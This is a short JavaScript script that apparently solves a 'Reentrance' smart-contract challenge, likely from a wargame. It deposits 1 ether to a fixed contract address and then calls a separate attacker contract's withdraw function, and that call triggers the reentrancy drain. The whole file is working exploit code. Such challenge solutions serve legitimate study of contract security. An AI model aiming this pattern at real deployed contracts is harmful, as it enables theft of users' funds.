const reentranceAttackerJson = require("../artifacts/contracts/10_ReentranceAttacker.sol/ReentranceAttacker.json");
const reentranceJson = require("../artifacts/contracts/10_Reentrance.sol/Reentrance.json");
const REENTRANCE_ATTACKER_ADDRESS = "0xd5236833982aB26Ad2dc6E2ABfac5D356FBDCd38";
const REENTRANCE_ADDRESS = "0xC4c365b8E736934Dd791F16E22fdD9e8Cd218458";


async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Executing with account:", signer.address);

  const weiAmount = (await signer.getBalance()).toString();
  
  console.log("Account balance:", (await ethers.utils.formatEther(weiAmount)));

  const reentranceContract = new ethers.Contract(REENTRANCE_ADDRESS, reentranceJson.abi, signer);

  const reentranceAttackerContract = new ethers.Contract(REENTRANCE_ATTACKER_ADDRESS, reentranceAttackerJson.abi, signer);

  const receipt1 = await reentranceContract.donate(REENTRANCE_ATTACKER_ADDRESS, { value: ethers.utils.parseEther('1.0') })

  const tx1 = await receipt1.wait();

  console.log('tx1', tx1);

  const receipt2 = await reentranceAttackerContract.withdraw();

  const tx2 = await receipt2.wait();

  console.log('tx2', tx2);

  console.log('done!')
}

main();